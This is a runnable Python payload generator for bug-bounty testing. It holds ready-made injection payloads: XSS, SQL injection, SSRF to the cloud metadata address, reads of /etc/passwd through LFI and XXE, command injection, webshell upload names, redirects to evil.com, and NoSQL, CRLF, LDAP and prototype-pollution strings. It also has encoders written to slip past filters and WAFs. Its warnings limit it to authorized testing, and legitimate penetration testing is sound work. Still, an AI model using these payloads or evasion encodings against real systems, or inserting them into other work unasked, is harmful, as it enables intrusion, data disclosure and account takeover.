#!/usr/bin/env python3
"""
tools/payload_gen.py — Contextual payload generator (runnable)
(V10 bug-bounty — pick a class, get payloads + encoding/WAF-bypass variants)

Generates starter payloads for a vulnerability class and optional encoded
variants (url, double-url, html-entity, base64, unicode, case) to help defeat
naive filters/WAFs. Pulls base payloads from the pack's own payload files when
present, with built-in fallbacks.

⚠️ For AUTHORIZED, in-scope testing only. Payloads are benign probes — adapt to
the target context; do not use against systems you are not permitted to test.

Zero external deps (stdlib). Usage:
    python3 payload_gen.py list
    python3 payload_gen.py xss
    python3 payload_gen.py ssrf --encode url,base64
    python3 payload_gen.py sqli --json
"""
from __future__ import annotations

import argparse
import base64
import html
import json
import pathlib
import sys
import urllib.parse

ROOT = pathlib.Path(__file__).resolve().parent.parent
PAYLOAD_DIR = ROOT / "skills" / "09-security" / "payloads"

# class -> payload file basename (in the pack) + fallback payloads
CLASSES = {
    "xss":   ("xss.txt",   ['"><svg onload=alert(document.domain)>', "'-alert(1)-'",
                            "<img src=x onerror=alert(1)>", "javascript:alert(1)"]),
    "sqli":  ("sqli.txt",  ["' OR '1'='1", "' OR 1=1-- -", "1' AND SLEEP(5)-- -",
                            "' UNION SELECT NULL,version(),NULL-- -"]),
    "ssrf":  ("ssrf.txt",  ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1/",
                            "http://[::1]/", "gopher://127.0.0.1:6379/_"]),
    "ssti":  ("ssti.txt",  ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"]),
    "lfi":   ("lfi.txt",   ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
                            "php://filter/convert.base64-encode/resource=index.php"]),
    "xxe":   ("xxe.txt",   ['<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>']),
    "cmdi":  (None,        ["; id", "| id", "$(id)", "`id`", "%0a id"]),
    "upload":("file-upload.txt", ["shell.php.jpg", "shell.phtml",
                            '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>']),
    "redirect": (None,     ["//evil.com", "https://target.com@evil.com", "/\\evil.com"]),
    "nosql": (None,        ['{"$ne":null}', '{"$gt":""}', '{"$regex":"^a"}',
                            '{"username":{"$ne":null},"password":{"$ne":null}}',
                            '{"$where":"sleep(5000)"}', 'user[$ne]=x&pass[$ne]=x']),
    "crlf": (None,         ['%0d%0aSet-Cookie:x=1', '%0d%0aLocation:https://evil.com',
                            '%0d%0a%0d%0a<script>alert(document.domain)</script>',
                            '%E5%98%8A%E5%98%8DSet-Cookie:x=1']),
    "ldap": (None,         ['*', '*)(uid=*))(|(uid=*', 'admin)(&)', '*)(|(password=*)']),
    "xpath": (None,        ["' or '1'='1", "']|//*|//'", "' or position()=1 or '",
                            "' or substring(//user[1]/pass,1,1)='a"]),
    "prototype": (None,    ['{"__proto__":{"polluted":"yes"}}',
                            '{"constructor":{"prototype":{"polluted":"yes"}}}',
                            '?__proto__[polluted]=yes', '{"__proto__":{"isAdmin":true}}']),
}

ENCODERS = {
    "url":        lambda s: urllib.parse.quote(s, safe=""),
    "double-url": lambda s: urllib.parse.quote(urllib.parse.quote(s, safe=""), safe=""),
    "html":       lambda s: html.escape(s).replace("'", "&#39;"),
    "base64":     lambda s: base64.b64encode(s.encode()).decode(),
    "unicode":    lambda s: "".join(f"\\u{ord(c):04x}" if ord(c) < 128 else c for c in s),
    "case":       lambda s: "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s)),
}


def base_payloads(cls: str) -> list:
    fname, fallback = CLASSES[cls]
    if fname:
        f = PAYLOAD_DIR / fname
        if f.is_file():
            lines = [l.strip() for l in f.read_text().splitlines()
                     if l.strip() and not l.strip().startswith("#")]
            if lines:
                return lines
    return fallback


def generate(cls: str, encoders: list) -> dict:
    if cls not in CLASSES:
        raise KeyError(cls)
    payloads = base_payloads(cls)
    out = {"class": cls, "count": len(payloads), "payloads": payloads}
    if encoders:
        variants = {}
        for enc in encoders:
            if enc not in ENCODERS:
                raise ValueError(f"unknown encoder: {enc} (have: {', '.join(ENCODERS)})")
            variants[enc] = [ENCODERS[enc](p) for p in payloads]
        out["encoded"] = variants
    out["note"] = "Authorized, in-scope testing only. Adapt to the target context."
    return out


def main(argv):
    ap = argparse.ArgumentParser(description="Generate contextual payloads.")
    ap.add_argument("cls", nargs="?", help="class (xss/sqli/ssrf/...) or 'list'")
    ap.add_argument("--encode", default="", help="comma list: url,double-url,html,base64,unicode,case")
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args(argv[1:])

    if not args.cls or args.cls == "list":
        print("Classes:", ", ".join(CLASSES))
        print("Encoders:", ", ".join(ENCODERS))
        print("Usage: payload_gen.py <class> [--encode url,base64] [--json]")
        return 0

    encoders = [e.strip() for e in args.encode.split(",") if e.strip()]
    try:
        res = generate(args.cls, encoders)
    except KeyError:
        print(f"✗ unknown class '{args.cls}'. Options: {', '.join(CLASSES)}", file=sys.stderr)
        return 1
    except ValueError as e:
        print(f"✗ {e}", file=sys.stderr)
        return 1

    if args.json:
        print(json.dumps(res, indent=2)); return 0
    print(f"# {res['class']} — {res['count']} payload(s)")
    for p in res["payloads"]:
        print(f"  {p}")
    if "encoded" in res:
        for enc, vals in res["encoded"].items():
            print(f"\n# encoded [{enc}]")
            for v in vals:
                print(f"  {v}")
    print(f"\n⚠️  {res['note']}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
